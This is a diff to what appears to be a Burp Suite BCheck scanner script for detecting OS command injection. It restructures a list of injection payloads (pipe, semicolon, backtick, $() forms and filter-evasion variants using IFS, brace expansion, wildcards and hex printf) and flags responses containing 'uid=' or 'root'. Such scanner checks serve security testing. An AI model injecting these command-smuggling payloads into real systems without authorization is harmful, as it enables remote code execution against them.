@@ -5,26 +5,27 @@ metadata:
     author: "BCheck Arsenal"
     tags: "cmdi", "rce", "waf-bypass"
 
+run for each:
+    payload = "|id",
+        ";id",
+        "`id`",
+        "$(id)",
+        "%0aid",
+        ";%09id",
+        ";i${IFS}d",
+        ";{i,d}",
+        ";/???/i?",
+        ";$(printf '\x69\x64')",
+        "|whoami",
+        "&whoami",
+        "||whoami",
+        "&&whoami"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "|id"
-            - ";id"
-            - "`id`"
-            - "$(id)"
-            - "%0aid"
-            - ";%09id"
-            - ";i${IFS}d"
-            - ";{i,d}"
-            - ";/???/i?"
-            - ";$(printf '\x69\x64')"
-            - "|whoami"
-            - "&whoami"
-            - "||whoami"
-            - "&&whoami"
+        replacing: {payload}
 
-    if {check.response} matches "(uid=|gid=|groups=|root|www-data|AUTHORITY\\SYSTEM)" then
+    if {latest.response} matches "(uid=|gid=|groups=|root|www-data|AUTHORITY\\SYSTEM)" then
         report issue:
             severity: high
             confidence: certain
